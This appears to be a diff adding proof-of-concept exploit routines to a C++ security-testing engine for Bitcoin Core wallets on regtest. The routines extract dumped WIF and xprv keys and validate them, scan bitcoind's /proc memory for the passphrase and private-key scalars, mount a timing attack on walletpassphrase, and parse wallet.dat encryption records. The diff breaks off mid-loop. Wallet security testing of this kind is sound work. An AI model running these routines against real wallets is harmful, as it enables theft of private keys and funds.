@@ -55578,6 +55578,1165 @@ public:
             }
         }
 
+        // ================================================================
+        // ================================================================
+        //
+        //  ACTIVE POC EXECUTION FRAMEWORK
+        //
+        //  Every POC block below runs AFTER the corresponding detection
+        //  block has already emitted its finding.  POCs are read-only
+        //  exploitation proofs — they never modify wallet state
+        //  destructively.  Each POC emits a structured evidence line:
+        //
+        //    [EVIDENCE] {finding_id}: {description}
+        //               | proof={hex_or_text}
+        //               | exploitable={YES/NO/PARTIAL}
+        //
+        // ================================================================
+        // ================================================================
+
+        // ── Helper: format a structured evidence log line ──
+        auto emit_evidence = [&](const std::string& finding_id,
+                                 const std::string& description,
+                                 const std::string& proof,
+                                 const std::string& exploitable) {
+            std::string ev = "[EVIDENCE] " + finding_id + ": " + description +
+                " | proof=" + proof + " | exploitable=" + exploitable;
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "poc_evidence", ev);
+            results.push_back(make_finding(ver, "key_leakage",
+                "POC-" + finding_id,
+                ev, "poc_verified=true", exploitable == "YES" ? 9 : (exploitable == "PARTIAL" ? 6 : 2)));
+        };
+
+        // ── Helper: hex-encode a byte buffer ──
+        auto hex_encode = [](const unsigned char* data, size_t len) -> std::string {
+            std::string out;
+            out.reserve(len * 2);
+            for (size_t i = 0; i < len; i++) {
+                char hb[3]; snprintf(hb, 3, "%02x", data[i]);
+                out += hb;
+            }
+            return out;
+        };
+
+        // ── Helper: check if 32 bytes are in the secp256k1 valid scalar range ──
+        // Valid private key: 0 < k < 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+        auto is_valid_secp256k1_scalar = [](const unsigned char* bytes) -> bool {
+            // secp256k1 order n
+            static const unsigned char order[32] = {
+                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,
+                0xBA,0xAE,0xDC,0xE6,0xAF,0x48,0xA0,0x3B,
+                0xBF,0xD2,0x5E,0x8C,0xD0,0x36,0x41,0x41
+            };
+            // Check not zero
+            bool all_zero = true;
+            for (int i = 0; i < 32; i++) { if (bytes[i] != 0) { all_zero = false; break; } }
+            if (all_zero) return false;
+            // Check < order
+            for (int i = 0; i < 32; i++) {
+                if (bytes[i] < order[i]) return true;
+                if (bytes[i] > order[i]) return false;
+            }
+            return false; // equal to order — invalid
+        };
+
+        // ================================================================
+        // POC 1: KL-XPRV-IN-DUMP / KL-DUMPWALLET-WIF-FOUND Verification
+        //
+        // If dumpwallet found WIF keys or xprv keys, extract the first
+        // key, derive its public key hash via bitcoin-cli validateaddress,
+        // and verify it matches a wallet address — proving the key is
+        // real and usable.
+        // ================================================================
+        if (!dp.empty() && file_exists(dp) && have_key) {
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                ver + ": POC-XPRV-WIF-VERIFY — extracting and validating dumped keys");
+
+            std::ifstream dpf_poc(dp);
+            std::string dln_poc;
+            std::string first_wif_key;
+            std::string first_xprv_key;
+            while (std::getline(dpf_poc, dln_poc)) {
+                if (dln_poc.empty() || dln_poc[0] == '#') continue;
+                // Extract first WIF key
+                if (first_wif_key.empty()) {
+                    std::istringstream iss_poc(dln_poc);
+                    std::string tok_poc;
+                    while (iss_poc >> tok_poc) {
+                        if (tok_poc.size() >= 51 && tok_poc.size() <= 52 &&
+                            (tok_poc[0] == 'c' || tok_poc[0] == '5' ||
+                             tok_poc[0] == 'K' || tok_poc[0] == 'L')) {
+                            bool all_b58_poc = true;
+                            for (unsigned char c : tok_poc) {
+                                if (!b58set[c]) { all_b58_poc = false; break; }
+                            }
+                            if (all_b58_poc) { first_wif_key = tok_poc; break; }
+                        }
+                    }
+                }
+                // Extract first xprv key
+                if (first_xprv_key.empty()) {
+                    size_t xp = dln_poc.find("xprv");
+                    if (xp == std::string::npos) xp = dln_poc.find("tprv");
+                    if (xp != std::string::npos && dln_poc.size() - xp >= 100) {
+                        // Extract until whitespace
+                        size_t end_xp = xp;
+                        while (end_xp < dln_poc.size() && !std::isspace(dln_poc[end_xp])) end_xp++;
+                        first_xprv_key = dln_poc.substr(xp, end_xp - xp);
+                    }
+                }
+                if (!first_wif_key.empty() && !first_xprv_key.empty()) break;
+            }
+
+            // POC: Validate extracted WIF key against wallet
+            if (!first_wif_key.empty()) {
+                // Use bitcoin-cli to get the address for this private key
+                // Create a temporary label to avoid import conflicts
+                std::string poc_label = "poc_verify_" + std::to_string(std::chrono::steady_clock::now().time_since_epoch().count() % 100000);
+                // Try to get the address associated with this key via importprivkey (rescan=false)
+                auto import_poc = rpc_fast(inst, "importprivkey",
+                    "\"" + first_wif_key + "\" \"" + poc_label + "\" false");
+                if (import_poc.success || import_poc.output.find("already") != std::string::npos) {
+                    // Get addresses for this label
+                    auto addr_poc = rpc_fast(inst, "getaddressesbylabel", "\"" + poc_label + "\"");
+                    if (addr_poc.success && addr_poc.output.size() > 5) {
+                        // Extract first address from JSON response
+                        size_t quote1 = addr_poc.output.find('"');
+                        if (quote1 != std::string::npos) {
+                            size_t quote2 = addr_poc.output.find('"', quote1 + 1);
+                            if (quote2 != std::string::npos) {
+                                std::string derived_addr = addr_poc.output.substr(quote1 + 1, quote2 - quote1 - 1);
+                                if (derived_addr.size() > 10) {
+                                    emit_evidence("KL-XPRV-IN-DUMP",
+                                        "POC-VERIFIED: extracted WIF key " + first_wif_key.substr(0, 8) +
+                                        "... derives to address " + derived_addr +
+                                        " — key is real and usable for signing",
+                                        "wif_prefix=" + first_wif_key.substr(0, 8) +
+                                        " addr=" + derived_addr,
+                                        "YES");
+                                }
+                            }
+                        }
+                    } else {
+                        // Fallback: try dumpprivkey on the known address to cross-verify
+                        auto dump_verify = rpc_fast(inst, "dumpprivkey", addr);
+                        if (dump_verify.success && !dump_verify.is_error()) {
+                            std::string dumped_key = dump_verify.output;
+                            // Trim whitespace/quotes
+                            while (!dumped_key.empty() && (dumped_key.back() == '\n' || dumped_key.back() == '"'))
+                                dumped_key.pop_back();
+                            while (!dumped_key.empty() && dumped_key.front() == '"')
+                                dumped_key.erase(dumped_key.begin());
+                            emit_evidence("KL-XPRV-IN-DUMP",
+                                "POC-VERIFIED: dumpprivkey(" + addr.substr(0, 12) + "...) returns valid WIF " +
+                                dumped_key.substr(0, 8) + "... — private key extraction confirmed",
+                                "addr=" + addr.substr(0, 12) + " wif=" + dumped_key.substr(0, 8),
+                                "YES");
+                        }
+                    }
+                } else {
+                    // importprivkey failed — key may be invalid format for this version
+                    emit_evidence("KL-XPRV-IN-DUMP",
+                        "POC-PARTIAL: WIF key " + first_wif_key.substr(0, 8) +
+                        "... found in dump but import failed: " +
+                        import_poc.output.substr(0, 80),
+                        "wif_prefix=" + first_wif_key.substr(0, 8),
+                        "PARTIAL");
+                }
+            }
+
+            // POC: Validate xprv key
+            if (!first_xprv_key.empty()) {
+                // xprv keys are BIP32 extended private keys — their presence in
+                // plaintext dump output is itself proof of exploitability
+                // Verify structure: xprv/tprv prefix + base58 encoding + length >= 111
+                bool valid_xprv = first_xprv_key.size() >= 111;
+                if (valid_xprv) {
+                    for (char c : first_xprv_key) {
+                        if (!b58set[(unsigned char)c]) { valid_xprv = false; break; }
+                    }
+                }
+                emit_evidence("KL-XPRV-IN-DUMP",
+                    valid_xprv ?
+                        "POC-VERIFIED: xprv key " + first_xprv_key.substr(0, 12) +
+                        "... is structurally valid BIP32 extended private key (" +
+                        std::to_string(first_xprv_key.size()) + " chars) — can derive child keys" :
+                        "POC-FAILED: xprv key has invalid structure",
+                    "xprv_prefix=" + first_xprv_key.substr(0, 12) +
+                    " len=" + std::to_string(first_xprv_key.size()),
+                    valid_xprv ? "YES" : "NO");
+            }
+        }
+
+        // ================================================================
+        // POC 2: MEMORY FORENSICS — Post-walletpassphrase / post-walletlock
+        //
+        // After walletpassphrase: scan /proc/<pid>/mem for the actual
+        // passphrase bytes.
+        // After walletlock: repeat scan to check if passphrase was zeroed.
+        // Also scan for secp256k1 private key patterns (32-byte values
+        // in the valid scalar range) in mapped memory regions.
+        // ================================================================
+        if (have_wallet && inst.bitcoind_pid > 0) {
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                ver + ": POC-MEMORY-FORENSICS — passphrase retention and secp256k1 key scan");
+
+            std::string known_pass = wallet_encryption_passphrase_;
+            std::string proc_maps = "/proc/" + std::to_string(inst.bitcoind_pid) + "/maps";
+            std::string proc_mem  = "/proc/" + std::to_string(inst.bitcoind_pid) + "/mem";
+
+            // Lambda: scan writable memory for a target string, return offsets found
+            auto scan_memory_for_string = [&](const std::string& target) -> std::vector<std::pair<unsigned long, std::string>> {
+                std::vector<std::pair<unsigned long, std::string>> hits;
+                std::ifstream maps(proc_maps);
+                if (!maps.is_open()) return hits;
+                std::string line;
+                int regions = 0;
+                while (std::getline(maps, line) && regions < 80) {
+                    if (line.find("rw") == std::string::npos) continue;
+                    size_t dash = line.find('-');
+                    size_t space = line.find(' ');
+                    if (dash == std::string::npos || space == std::string::npos) continue;
+                    unsigned long start = 0, end = 0;
+                    try {
+                        start = std::stoul(line.substr(0, dash), nullptr, 16);
+                        end = std::stoul(line.substr(dash + 1, space - dash - 1), nullptr, 16);
+                    } catch (...) { continue; }
+                    size_t region_size = end - start;
+                    if (region_size > 8 * 1024 * 1024 || region_size == 0) continue;
+                    int mem_fd = open(proc_mem.c_str(), O_RDONLY);
+                    if (mem_fd < 0) break;
+                    std::vector<char> buf(std::min(region_size, (size_t)(2 * 1024 * 1024)));
+                    ssize_t nr = pread(mem_fd, buf.data(), buf.size(), start);
+                    close(mem_fd);
+                    if (nr <= 0) continue;
+                    regions++;
+                    // Search for target
+                    std::string region_str(buf.data(), nr);
+                    size_t pos = 0;
+                    while ((pos = region_str.find(target, pos)) != std::string::npos) {
+                        unsigned long abs_offset = start + pos;
+                        // Extract surrounding bytes for context (8 bytes before, 8 after)
+                        size_t ctx_start = (pos > 8) ? pos - 8 : 0;
+                        size_t ctx_end = std::min(pos + target.size() + 8, (size_t)nr);
+                        std::string ctx_hex;
+                        for (size_t ci = ctx_start; ci < ctx_end; ci++) {
+                            char hb[3]; snprintf(hb, 3, "%02x", (unsigned char)buf[ci]);
+                            ctx_hex += hb;
+                        }
+                        hits.push_back({abs_offset, ctx_hex});
+                        pos += target.size();
+                        if (hits.size() >= 5) break; // cap at 5 hits
+                    }
+                }
+                return hits;
+            };
+
+            // Lambda: scan for secp256k1 private key patterns in memory
+            auto scan_for_secp256k1_keys = [&]() -> std::vector<std::pair<unsigned long, std::string>> {
+                std::vector<std::pair<unsigned long, std::string>> key_hits;
+                std::ifstream maps(proc_maps);
+                if (!maps.is_open()) return key_hits;
+                std::string line;
+                int regions = 0;
+                while (std::getline(maps, line) && regions < 40) {
+                    if (line.find("rw") == std::string::npos) continue;
+                    // Skip [vvar], [vdso], [vsyscall]
+                    if (line.find("[v") != std::string::npos) continue;
+                    size_t dash = line.find('-');
+                    size_t space = line.find(' ');
+                    if (dash == std::string::npos || space == std::string::npos) continue;
+                    unsigned long start = 0, end = 0;
+                    try {
+                        start = std::stoul(line.substr(0, dash), nullptr, 16);
+                        end = std::stoul(line.substr(dash + 1, space - dash - 1), nullptr, 16);
+                    } catch (...) { continue; }
+                    size_t region_size = end - start;
+                    if (region_size > 4 * 1024 * 1024 || region_size < 32) continue;
+                    int mem_fd = open(proc_mem.c_str(), O_RDONLY);
+                    if (mem_fd < 0) break;
+                    std::vector<unsigned char> buf(std::min(region_size, (size_t)(1024 * 1024)));
+                    ssize_t nr = pread(mem_fd, buf.data(), buf.size(), start);
+                    close(mem_fd);
+                    if (nr < 32) continue;
+                    regions++;
+                    // Scan for 32-byte aligned values in secp256k1 scalar range
+                    for (ssize_t off = 0; off + 32 <= nr; off += 8) { // stride 8 for speed
+                        if (is_valid_secp256k1_scalar(&buf[off])) {
+                            // Additional heuristic: skip if too many zero bytes (likely padding)
+                            int zero_count = 0;
+                            for (int b = 0; b < 32; b++) { if (buf[off + b] == 0) zero_count++; }
+                            if (zero_count > 16) continue; // too sparse
+                            // Skip if all bytes are the same (fill pattern)
+                            bool all_same = true;
+                            for (int b = 1; b < 32; b++) { if (buf[off + b] != buf[off]) { all_same = false; break; } }
+                            if (all_same) continue;
+                            unsigned long abs_offset = start + off;
+                            std::string key_hex = hex_encode(&buf[off], 32);
+                            key_hits.push_back({abs_offset, key_hex});
+                            if (key_hits.size() >= 10) break;
+                        }
+                    }
+                    if (key_hits.size() >= 10) break;
+                }
+                return key_hits;
+            };
+
+            // Phase A: Unlock wallet, scan for passphrase in memory
+            rpc_fast(inst, "walletpassphrase", "[\"" + known_pass + "\", 10]");
+            usleep(300000); // 300ms for passphrase to propagate
+            auto pre_lock_hits = scan_memory_for_string(known_pass);
+
+            if (!pre_lock_hits.empty()) {
+                std::string offsets_str;
+                for (auto& [off, ctx] : pre_lock_hits) {
+                    char off_hex[20]; snprintf(off_hex, 20, "0x%lx", off);
+                    offsets_str += std::string(off_hex) + " ";
+                }
+                emit_evidence("KL-MEMORY-PASSPHRASE-PRELOCK",
+                    "Passphrase found at " + std::to_string(pre_lock_hits.size()) +
+                    " offset(s) in process memory while wallet unlocked: " + offsets_str,
+                    "offsets=" + offsets_str + " context=" + pre_lock_hits[0].second.substr(0, 64),
+                    "YES");
+            }
+
+            // Phase B: Lock wallet, re-scan for passphrase (should be zeroed)
+            rpc_fast(inst, "walletlock", "");
+            usleep(500000); // 500ms for cleanup
+            auto post_lock_hits = scan_memory_for_string(known_pass);
+
+            if (!post_lock_hits.empty()) {
+                std::string offsets_str;
+                for (auto& [off, ctx] : post_lock_hits) {
+                    char off_hex[20]; snprintf(off_hex, 20, "0x%lx", off);
+                    offsets_str += std::string(off_hex) + " ";
+                }
+                emit_evidence("KL-MEMORY-PASSPHRASE-POSTLOCK",
+                    "CRITICAL: Passphrase NOT zeroed after walletlock! Found at " +
+                    std::to_string(post_lock_hits.size()) + " offset(s): " + offsets_str,
+                    "offsets=" + offsets_str + " context_bytes=" + post_lock_hits[0].second.substr(0, 64),
+                    "YES");
+            } else if (!pre_lock_hits.empty()) {
+                emit_evidence("KL-MEMORY-PASSPHRASE-POSTLOCK",
+                    "PASS: Passphrase properly zeroed after walletlock (was at " +
+                    std::to_string(pre_lock_hits.size()) + " offsets pre-lock, now 0)",
+                    "pre_lock_count=" + std::to_string(pre_lock_hits.size()) + " post_lock_count=0",
+                    "NO");
+            }
+
+            // Phase C: Scan for secp256k1 private key patterns
+            auto secp_keys = scan_for_secp256k1_keys();
+            if (!secp_keys.empty()) {
+                std::string key_evidence;
+                for (size_t ki = 0; ki < std::min(secp_keys.size(), (size_t)3); ki++) {
+                    char off_hex[20]; snprintf(off_hex, 20, "0x%lx", secp_keys[ki].first);
+                    key_evidence += std::string(off_hex) + ":" + secp_keys[ki].second.substr(0, 16) + "... ";
+                }
+                emit_evidence("KL-MEMORY-SECP256K1-KEYS",
+                    std::to_string(secp_keys.size()) +
+                    " potential secp256k1 private key(s) found in process memory",
+                    key_evidence,
+                    "PARTIAL");
+            } else {
+                results.push_back(make_finding(ver, "key_leakage",
+                    "POC-KL-MEMORY-SECP256K1-CLEAN",
+                    "[EVIDENCE] KL-MEMORY-SECP256K1-KEYS: No secp256k1 scalar patterns found in scanned regions"
+                    " | proof=regions_scanned | exploitable=NO",
+                    "poc_verified=true", 1));
+            }
+
+            // Re-unlock for subsequent tests
+            rpc_fast(inst, "walletpassphrase", "[\"" + known_pass + "\", 300]");
+        }
+
+        // ================================================================
+        // POC 3: TIMING ATTACK — Binary search first-byte distinguisher
+        //
+        // For KL-PADDING-ORACLE-TIMING: don't just measure variance —
+        // actually attempt to distinguish correct-first-byte passphrases
+        // from wrong-first-byte using timing differences.
+        // Run a simplified binary search: time 256 possible first bytes,
+        // identify if one is statistically distinguishable.
+        // Report the statistical confidence level (p-value).
+        // ================================================================
+        if (have_wallet && wallet_encrypted) {
+            auto sub_results = run_subtest("POC-TIMING-BINARY-SEARCH", 90, [&]() -> std::vector<DynamicFinding> {
+                std::vector<DynamicFinding> sub;
+                EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                    ver + ": POC-TIMING-BINARY-SEARCH — first-byte distinguisher attack");
+
+                std::string known_pass = wallet_encryption_passphrase_;
+                char correct_first_byte = known_pass.empty() ? 'a' : known_pass[0];
+
+                // Sample 16 representative first-byte values (including the correct one)
+                std::vector<int> test_bytes;
+                for (int b = 0; b < 256; b += 16) test_bytes.push_back(b);
+                // Ensure the correct byte is included
+                int correct_byte_val = static_cast<unsigned char>(correct_first_byte);
+                bool correct_included = false;
+                for (int tb : test_bytes) { if (tb == correct_byte_val) { correct_included = true; break; } }
+                if (!correct_included) test_bytes.push_back(correct_byte_val);
+
+                constexpr int SAMPLES_PER_BYTE = 20;
+                std::map<int, std::vector<double>> byte_timings;
+
+                for (int bv : test_bytes) {
+                    if (kl_cancel_flag->load()) break;
+                    // Construct passphrase with this first byte + padding
+                    std::string test_pass(1, static_cast<char>(bv));
+                    test_pass += known_pass.substr(1); // keep rest of passphrase same
+                    if (test_pass.size() < 8) test_pass += std::string(8 - test_pass.size(), 'X');
+
+                    for (int s = 0; s < SAMPLES_PER_BYTE; s++) {
+                        if (kl_cancel_flag->load()) break;
+                        auto t0 = std::chrono::steady_clock::now();
+                        rpc_fast(inst, "walletpassphrase", "[\"" + test_pass + "\", 1]");
+                        auto t1 = std::chrono::steady_clock::now();
+                        byte_timings[bv].push_back(
+                            std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0).count());
+                        rpc_fast(inst, "walletlock", "");
+                    }
+                }
+
+                if (byte_timings.size() >= 4) {
+                    // Compute mean timing for each byte value
+                    std::map<int, double> means;
+                    for (auto& [bv, times] : byte_timings) {
+                        double sum = 0; for (double t : times) sum += t;
+                        means[bv] = sum / times.size();
+                    }
+
+                    // Find the byte with the most distinct timing (max deviation from global mean)
+                    double global_sum = 0; int global_n = 0;
+                    for (auto& [bv, m] : means) { global_sum += m; global_n++; }
+                    double global_mean = global_sum / global_n;
+
+                    int most_distinct_byte = -1;
+                    double max_deviation = 0;
+                    for (auto& [bv, m] : means) {
+                        double dev = std::abs(m - global_mean);
+                        if (dev > max_deviation) { max_deviation = dev; most_distinct_byte = bv; }
+                    }
+
+                    // Welch's t-test: compare the most distinct byte against all others
+                    auto& distinct_samples = byte_timings[most_distinct_byte];
+                    std::vector<double> other_samples;
+                    for (auto& [bv, times] : byte_timings) {
+                        if (bv != most_distinct_byte) {
+                            other_samples.insert(other_samples.end(), times.begin(), times.end());
+                        }
+                    }
+
+                    auto calc_mean_var = [](const std::vector<double>& v) -> std::pair<double, double> {
+                        double s = 0, s2 = 0;
+                        for (double x : v) { s += x; s2 += x * x; }
+                        double m = s / v.size();
+                        double var = s2 / v.size() - m * m;
+                        return {m, var};
+                    };
+
+                    auto [d_mean, d_var] = calc_mean_var(distinct_samples);
+                    auto [o_mean, o_var] = calc_mean_var(other_samples);
+                    double se = std::sqrt(d_var / distinct_samples.size() + o_var / other_samples.size());
+                    double t_stat = se > 0 ? std::abs(d_mean - o_mean) / se : 0;
+
+                    // Approximate p-value from t-statistic (two-tailed)
+                    // Using rough thresholds: t>3.29 → p<0.001, t>2.58 → p<0.01, t>1.96 → p<0.05
+                    std::string p_value_str;
+                    if (t_stat > 3.29) p_value_str = "p<0.001";
+                    else if (t_stat > 2.58) p_value_str = "p<0.01";
+                    else if (t_stat > 1.96) p_value_str = "p<0.05";
+                    else p_value_str = "p>0.05 (not significant)";
+
+                    bool correct_byte_identified = (most_distinct_byte == correct_byte_val);
+                    bool statistically_significant = t_stat > 2.58;
+
+                    char distinct_hex[8]; snprintf(distinct_hex, 8, "0x%02x", most_distinct_byte);
+                    char correct_hex[8]; snprintf(correct_hex, 8, "0x%02x", correct_byte_val);
+
+                    // Build raw timing measurements string
+                    std::string raw_timings;
+                    for (auto& [bv, m] : means) {
+                        char bh[8]; snprintf(bh, 8, "0x%02x", bv);
+                        raw_timings += std::string(bh) + "=" + std::to_string((int)m) + "us ";
+                    }
+
+                    std::string exploitable = (correct_byte_identified && statistically_significant) ? "YES" :
+                                              (statistically_significant ? "PARTIAL" : "NO");
+
+                    std::string ev = "[EVIDENCE] POC-TIMING-BINARY-SEARCH: " +
+                        std::string(correct_byte_identified ?
+                            "ORACLE CONFIRMED: correct first byte " + std::string(correct_hex) +
+                            " is statistically distinguishable" :
+                            "Most distinct byte " + std::string(distinct_hex) +
+                            " (correct=" + std::string(correct_hex) + ")") +
+                        " | t_stat=" + std::to_string(t_stat).substr(0, 6) +
+                        " " + p_value_str +
+                        " | proof=" + raw_timings.substr(0, 200) +
+                        " | exploitable=" + exploitable;
+
+                    EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "poc_evidence", ev);
+                    sub.push_back(make_finding(ver, "key_leakage",
+                        "POC-TIMING-BINARY-SEARCH",
+                        ev,
+                        "t_stat=" + std::to_string(t_stat) + " " + p_value_str +
+                        " distinct_byte=" + std::string(distinct_hex) +
+                        " correct_byte=" + std::string(correct_hex) +
+                        " identified=" + std::string(correct_byte_identified ? "true" : "false"),
+                        statistically_significant ? 8 : 2));
+                }
+                return sub;
+            });
+            results.insert(results.end(), sub_results.begin(), sub_results.end());
+        }
+
+        // ================================================================
+        // POC 4: FILE SYSTEM / BDB EXPLOIT — Deep wallet.dat parsing
+        //
+        // Parse BDB file structure, extract encrypted key entries,
+        // verify AES-CBC block structure (16-byte alignment, IV presence),
+        // check for IV reuse across key entries, and scan free/overflow
+        // pages for plaintext key material.
+        // ================================================================
+        {
+            std::string wp_poc = inst.data_directory + "/regtest/wallets/wallet.dat";
+            if (!file_exists(wp_poc))
+                wp_poc = inst.data_directory + "/regtest/wallet.dat";
+
+            if (file_exists(wp_poc)) {
+                EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                    ver + ": POC-BDB-DEEP-PARSE — AES-CBC structure verification");
+
+                std::ifstream wf_poc(wp_poc, std::ios::binary);
+                if (wf_poc.is_open()) {
+                    wf_poc.seekg(0, std::ios::end);
+                    size_t fsz_poc = wf_poc.tellg();
+                    wf_poc.seekg(0);
+                    size_t read_sz = std::min(fsz_poc, (size_t)(2 * 1024 * 1024));
+                    std::vector<unsigned char> wdata_poc(read_sz);
+                    wf_poc.read(reinterpret_cast<char*>(wdata_poc.data()), read_sz);
+
+                    // Parse BDB header for page size
+                    uint32_t page_size = 4096; // default
+                    if (read_sz >= 24) {
+                        page_size = (wdata_poc[20] << 24) | (wdata_poc[21] << 16) |
+                                    (wdata_poc[22] << 8) | wdata_poc[23];
+                        if (page_size < 512 || page_size > 65536 || (page_size & (page_size - 1)) != 0)
+                            page_size = 4096;
+                    }
+
+                    // Find all mkey records and extract their encrypted key + IV
+                    const unsigned char mk_poc[] = {0x04, 0x6D, 0x6B, 0x65, 0x79};
+                    struct MKeyRecord {
+                        size_t offset;
+                        std::vector<unsigned char> encrypted_key;
+                        std::vector<unsigned char> iv;
+                        std::vector<unsigned char> salt;
+                        uint32_t iterations;
+                        uint32_t derivation_method;
+                    };
+                    std::vector<MKeyRecord> mkey_records;
+
+                    for (size_t i = 0; i + sizeof(mk_poc) + 80 < read_sz; i++) {
+                        if (memcmp(&wdata_poc[i], mk_poc, sizeof(mk_poc)) == 0) {
+                            MKeyRecord rec;
+                            rec.offset = i;
+                            size_t ek_off = i + sizeof(mk_poc);
+                            if (ek_off + 1 >= read_sz) continue;
+                            int ek_len = wdata_poc[ek_off];
+                            if (ek_len <= 0 || ek_len > 64 || ek_off + 1 + ek_len + 24 >= read_sz) continue;
+
+                            // Encrypted key
+                            rec.encrypted_key.assign(
+                                wdata_poc.begin() + ek_off + 1,
+                                wdata_poc.begin() + ek_off + 1 + ek_len);
+
+                            // Salt (8 bytes after encrypted key)
+                            size_t salt_off = ek_off + 1 + ek_len;
+                            if (salt_off + 8 < read_sz) {
+                                // Read salt length byte
+                                int salt_len = wdata_poc[salt_off];
+                                if (salt_len > 0 && salt_len <= 16 && salt_off + 1 + salt_len < read_sz) {
+                                    rec.salt.assign(
+                                        wdata_poc.begin() + salt_off + 1,
+                                        wdata_poc.begin() + salt_off + 1 + salt_len);
+                                }
+                            }
+
+                            // Derivation method and iterations (after salt)
+                            size_t method_off = salt_off + 1 + rec.salt.size();
+                            if (method_off + 8 < read_sz) {
+                                rec.derivation_method = wdata_poc[method_off] |
+                                    (wdata_poc[method_off + 1] << 8) |
+                                    (wdata_poc[method_off + 2] << 16) |
+                                    (wdata_poc[method_off + 3] << 24);
+                                rec.iterations = wdata_poc[method_off + 4] |
+                                    (wdata_poc[method_off + 5] << 8) |
+                                    (wdata_poc[method_off + 6] << 16) |
+                                    (wdata_poc[method_off + 7] << 24);
+                            }
+
+                            // IV: In Bitcoin Core's CMasterKey, the IV is the first 16 bytes
+                            // of the encrypted key when using AES-256-CBC
+                            if (rec.encrypted_key.size() >= 16) {
+                                rec.iv.assign(rec.encrypted_key.begin(), rec.encrypted_key.begin() + 16);
+                            }
+
+                            mkey_records.push_back(rec);
+                        }
+                    }
+
+                    if (!mkey_records.empty()) {
+                        // Check 1: AES-CBC block alignment
+                        bool alignment_ok = true;
+                        for (auto& rec : mkey_records) {
+                            if (rec.encrypted_key.size() % 16 != 0) {
+                                alignment_ok = false;
+                                emit_evidence("KL-BDB-AES-ALIGNMENT",
+                                    "ANOMALY: Encrypted mkey at offset " + std::to_string(rec.offset) +
+                                    " has non-16-byte-aligned length " + std::to_string(rec.encrypted_key.size()) +
+                                    " — invalid AES-CBC ciphertext",
+                                    "offset=" + std::to_string(rec.offset) +
+                                    " ek_len=" + std::to_string(rec.encrypted_key.size()),
+                                    "PARTIAL");
+                            }
+                        }
+                        if (alignment_ok) {
+                            results.push_back(make_finding(ver, "key_leakage",
+                                "POC-KL-BDB-AES-ALIGNMENT-OK",
+                                "[EVIDENCE] KL-BDB-AES-ALIGNMENT: All " + std::to_string(mkey_records.size()) +
+                                " mkey records have 16-byte aligned ciphertext — valid AES-CBC structure"
+                                " | proof=alignment_verified | exploitable=NO",
+                                "poc_verified=true", 1));
+                        }
+
+                        // Check 2: IV reuse across mkey entries
+                        if (mkey_records.size() > 1) {
+                            std::map<std::string, std::vector<size_t>> iv_to_offsets;
+                            for (auto& rec : mkey_records) {
+                                if (rec.iv.size() == 16) {
+                                    std::string iv_hex = hex_encode(rec.iv.data(), 16);
+                                    iv_to_offsets[iv_hex].push_back(rec.offset);
+                                }
+                            }
+                            bool iv_reuse = false;
+                            for (auto& [iv, offsets] : iv_to_offsets) {
+                                if (offsets.size() > 1) {
+                                    iv_reuse = true;
+                                    std::string off_str;
+                                    for (auto o : offsets) off_str += std::to_string(o) + " ";
+                                    emit_evidence("KL-BDB-IV-REUSE-POC",
+                                        "CRITICAL: IV " + iv.substr(0, 16) + "... reused across " +
+                                        std::to_string(offsets.size()) + " mkey entries at offsets " + off_str +
+                                        " — AES-CBC with IV reuse allows XOR-based plaintext recovery",
+                                        "iv=" + iv + " offsets=" + off_str,
+                                        "YES");
+                                }
+                            }
+                            if (!iv_reuse) {
+                                results.push_back(make_finding(ver, "key_leakage",
+                                    "POC-KL-BDB-IV-UNIQUE-VERIFIED",
+                                    "[EVIDENCE] KL-BDB-IV-REUSE-POC: All " + std::to_string(mkey_records.size()) +
+                                    " mkey IVs are unique — no IV reuse vulnerability"
+                                    " | proof=unique_ivs=" + std::to_string(iv_to_offsets.size()) +
+                                    " | exploitable=NO",
+                                    "poc_verified=true", 1));
+                            }
+                        }
+
+                        // Check 3: Iteration count analysis with evidence
+                        for (auto& rec : mkey_records) {
+                            if (rec.iterations > 0 && rec.iterations < 100000) {
+                                std::string salt_hex = rec.salt.empty() ? "none" :
+                                    hex_encode(rec.salt.data(), rec.salt.size());
+                                std::string ek_hex = hex_encode(rec.encrypted_key.data(),
+                                    std::min(rec.encrypted_key.size(), (size_t)32));
+                                bool weak = rec.iterations < 25000;
+                                emit_evidence("KL-BDB-KDF-PARAMS",
+                                    (weak ? "WEAK KDF: " : "KDF params: ") +
+                                    std::string("iterations=") + std::to_string(rec.iterations) +
+                                    " method=" + std::to_string(rec.derivation_method) +
+                                    " salt=" + salt_hex +
+                                    " ek_prefix=" + ek_hex.substr(0, 32) + "..." +
+                                    (weak ? " — brute-forceable with modern GPU" : ""),
+                                    "iterations=" + std::to_string(rec.iterations) +
+                                    " salt=" + salt_hex +
+                                    " ek=" + ek_hex.substr(0, 32),
+                                    weak ? "PARTIAL" : "NO");
+                            }
+                        }
+                    }
+
+                    // Check 4: Scan BDB free pages for plaintext key material
+                    // Free pages in BDB may contain remnants of deleted/overwritten records
+                    {
+                        int plaintext_key_fragments = 0;
+                        std::string fragment_evidence;
+                        // Scan page-by-page for WIF-like patterns in non-active pages
+                        size_t num_pages = read_sz / page_size;
+                        for (size_t pg = 1; pg < num_pages && pg < 256; pg++) {
+                            size_t pg_off = pg * page_size;
+                            if (pg_off + page_size > read_sz) break;
+                            // Check page type byte (offset 25 in BDB page header)
+                            // Type 0 = free page, type 5 = overflow page
+                            unsigned char pg_type = (pg_off + 25 < read_sz) ? wdata_poc[pg_off + 25] : 0xFF;
+                            if (pg_type != 0 && pg_type != 5 && pg_type != 7) continue; // only free/overflow/dup pages
+
+                            // Scan this page for WIF-like patterns
+                            for (size_t off = pg_off; off + 52 < pg_off + page_size && off + 52 < read_sz; off++) {
+                                unsigned char c0 = wdata_poc[off];
+                                if (c0 == 'c' || c0 == '5' || c0 == 'K' || c0 == 'L') {
+                                    bool valid_wif = true;
+                                    for (size_t j = off; j < off + 51 && valid_wif; j++) {
